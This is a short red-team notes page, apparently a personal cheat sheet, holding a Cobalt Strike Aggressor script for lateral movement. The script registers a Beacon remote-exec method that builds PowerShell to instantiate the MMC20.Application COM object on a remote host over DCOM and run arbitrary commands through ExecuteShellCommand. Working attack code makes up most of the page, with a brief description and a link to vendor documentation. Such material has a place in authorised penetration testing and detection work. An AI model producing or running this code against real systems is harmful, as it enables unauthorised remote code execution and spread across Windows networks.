# Remote-Exec

Search Tag(s): #helpers #command-and-control #post-exploitation #lateral-movement #cobalt-strike

TODO: Provide more aggressor scripts for remote-exec lateral movement

## DCOM

`$ cat dcom-remote-exec.cna`

---

```perl
sub mmc20_exec_method {
   local('$script $command $args');

   # state what we're doing.
   btask($1, "Tasked Beacon to run $3 on $2 via DCOM", "T1175");

   # separate our command and arguments
   if ($3 ismatch '(.*?) (.*)') {
      ($command, $args) = matched();
   }
   else {
      $command = $3;
      $args    = "";
   }
    
   # build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
   $script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "';
   $script .= $2;
   $script .=  '")).Document.ActiveView.ExecuteShellCommand("';
   $script .= $command;
   $script .= '", $null, "';   
   $script .= $args;
   $script .= '", "7");';

   # run the script we built up
   bpowershell!($1, $script, "");
}

beacon_remote_exec_method_register("com-mmc20", "Execute command via MMC20.Application COM Object", &mmc20_exec_method);
```

---
## References

- [Aggressor Script: Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as_beacon.htm)